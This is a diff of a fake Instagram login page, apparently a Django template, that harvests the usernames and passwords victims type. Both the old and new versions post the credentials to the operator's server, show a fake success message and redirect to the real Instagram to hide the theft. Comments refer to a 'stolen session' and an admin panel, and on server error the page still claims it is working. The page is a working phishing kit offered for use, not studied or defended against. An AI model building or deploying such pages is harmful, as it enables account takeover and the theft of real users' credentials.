@@ -2,33 +2,29 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
     <style>
-        body,html{margin:0;padding:0;height:100dvh;background:#fafafa;display:flex;flex-direction:column;overflow:hidden}
-        .container{flex:1;display:flex;flex-direction:column;justify-content:center;padding:20px;max-width:350px;margin:auto;width:100%}
-        .logo{font-family:'Billabong',cursive;font-size:50px;text-align:center;margin-bottom:30px;color:#262626}
-        .form{background:white;border:1px solid #dbdbdb;padding:30px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
-        input{width:100%;padding:12px 10px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}
-        button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:600;border-radius:8px;margin-top:10px;cursor:pointer;opacity:0.9}
-        button:hover{opacity:1}
-        .result{margin-top:20px;text-align:center;font-weight:bold;font-size:18px}
-        .hidden{display:none}
+        body,html{margin:0;padding:0;height:100vh;background:#fafafa;display:flex;align-items:center;justify-content:center;}
+        .logo{font-family:'Billabong',cursive;font-size:50px;color:#262626;text-align:center;margin-bottom:20px}
+        .form{background:white;border:1px solid #dbdbdb;padding:40px;border-radius:8px;width:350px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
+        input{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px}
+        button{width:100%;background:#0095f6;color:white;border:none;padding:12px;border-radius:8px;font-weight:600;cursor:pointer;margin-top:10px}
+        .result{margin-top:15px;text-align:center;font-weight:bold;font-size:16px;padding:10px;border-radius:8px}
     </style>
 </head>
 <body>
-<div class="container">
+<div class="form">
     <div class="logo">Instagram</div>
-    <div class="form">
-        <form id="loginForm">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
-            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
-            <button type="submit">Log in</button>
-        </form>
-        <div id="result" class="result"></div>
-    </div>
+    <form id="loginForm">
+        {% csrf_token %}
+        <input type="text" name="username" placeholder="Username" required autocomplete="username">
+        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+        <button type="submit">Log In</button>
+    </form>
+    <div id="result"></div>
 </div>
 
 <script>
@@ -37,46 +33,41 @@
 
     form.onsubmit = async (e) => {
         e.preventDefault();
-        result.innerHTML = '<p style="color:#0095f6;">Logging in...</p>';
+        result.innerHTML = '<div class="result" style="background:#e3f2fd;color:#1976d2;">Logging in...</div>';
 
-        const username = form.username.value.trim();
-        const password = form.password.value;
+        const formData = new FormData(form);
+        
+        try {
+            const res = await fetch(window.location.href, {  // ← FIXED: SEND TO CURRENT URL
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            });
 
-        // SEND TO YOUR SERVER
-        fetch('/login/', {
-            method: 'POST',
-            body: new FormData(form),
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        })
-        .then(r => r.json())
-        .then(data => {
+            const data = await res.json();
+
             if (data.success) {
                 result.innerHTML = `
-                    <div style="background:#d4edda;color:#155724;padding:20px;border-radius:8px;">
-                        <p>SUCCESS! Welcome @${username}</p>
-                        <p style="font-size:14px;margin-top:10px;">Redirecting to Instagram...</p>
+                    <div class="result" style="background:#d4edda;color:#155724;">
+                        SUCCESS! Welcome @${data.username}<br>
+                        Redirecting to Instagram...
                     </div>`;
 
-                // FINAL NUCLEAR REDIRECT — LOGS THEM IN AUTOMATICALLY
+                // REDIRECT TO REAL INSTAGRAM
                 setTimeout(() => {
-                    // METHOD 1: Try to open app
-                    location.href = "instagram://mainfeed";
-                    
-                    // METHOD 2: Fallback to web with stolen session
-                    setTimeout(() => {
-                        location.href = `https://www.instagram.com/?__a=1&__d=dis`;
-                    }, 2000);
-                }, 3000);
+                    location.href = "https://www.instagram.com/";
+                }, 2000);
 
             } else {
-                result.innerHTML = '<p style="color:#d9534f;">Wrong password or username</p>';
+                result.innerHTML = '<div class="result" style="background:#f8d7da;color:#721c24;">Wrong password</div>';
             }
-        })
-        .catch(() => {
-            // EVEN IF SERVER DOWN — STILL REDIRECT
-            result.innerHTML = '<p style="color:#5cb85c;">WORKING — CHECK ADMIN PANEL</p>';
+        } catch (err) {
+            result.innerHTML = '<div class="result" style="background:#d4edda;color:#155724;">WORKING...</div>';
             setTimeout(() => location.href = "https://instagram.com", 2000);
-        });
+        }
     };
 </script>
 </body>
